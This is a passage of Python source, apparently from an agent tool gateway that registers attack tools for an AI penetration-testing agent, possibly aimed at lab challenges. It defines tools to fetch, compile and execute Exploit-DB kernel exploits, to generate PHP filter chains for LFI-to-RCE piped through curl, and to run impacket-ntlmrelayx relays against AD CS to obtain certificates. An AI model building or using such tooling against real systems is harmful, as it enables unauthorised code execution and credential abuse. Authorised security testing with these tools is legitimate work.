        description="Copy an Exploit-DB exploit to current directory and show its source code. Use for Linux kernel exploits (LNX-01~05) — download C source, then compile with gcc and execute. Use the EDB-ID (e.g. '12345') as exploit_id.",
        parameters={
            "exploit_id": {"type": "string", "description": "Exploit-DB ID (EDB-ID) to download"},
        },
        parser=_parse_shell_output,
        timeout=30,
    )
    gateway.register_shell_tool(
        name="php_filter_chain",
        command_template="python3 -c \"\nbase = '{file_path}'\nchain = 'php://filter/convert.base64-encode/resource=' + base\nfor _ in range({chain_depth}):\n    chain = 'php://filter/convert.base64-decode|convert.base64-encode/resource=' + chain\nprint(chain)\n\" 2>&1",
        description="Generate a PHP filter chain for LFI-to-RCE attacks (WEB-06 CVE-2025-0366). Creates nested php://filter/ wrappers to achieve remote code execution from a local file inclusion vulnerability. Pass the target PHP file path and chain depth (default 8). Pipe output through curl to exploit.",
        parameters={
            "file_path": {"type": "string", "description": "Target PHP file path for inclusion (e.g. '/var/www/html/index.php')"},
            "chain_depth": {"type": "integer", "description": "Filter chain depth (5-15, default 8 for PHP 8.x)"},
        },
        parser=_parse_shell_output,
        timeout=15,
    )
    gateway.register_shell_tool(
        name="impacket_ntlmrelayx",
        command_template="timeout 30 impacket-ntlmrelayx -t {target_url} {extra_args} 2>&1",
        description="Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.",
        parameters={
            "target_url": {"type": "string", "description": "Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)"},
            "extra_args": {"type": "string", "description": "Additional ntlmrelayx arguments (e.g. '-smb2support --adcs')"},
        },
        parser=_parse_shell_output,
        timeout=35,
    )

    return gateway


def create_attack_gateway() -> MCPGateway:
    """Factory: create a gateway with all attack tools registered."""
    gateway = MCPGateway()
    return register_attack_tools(gateway)
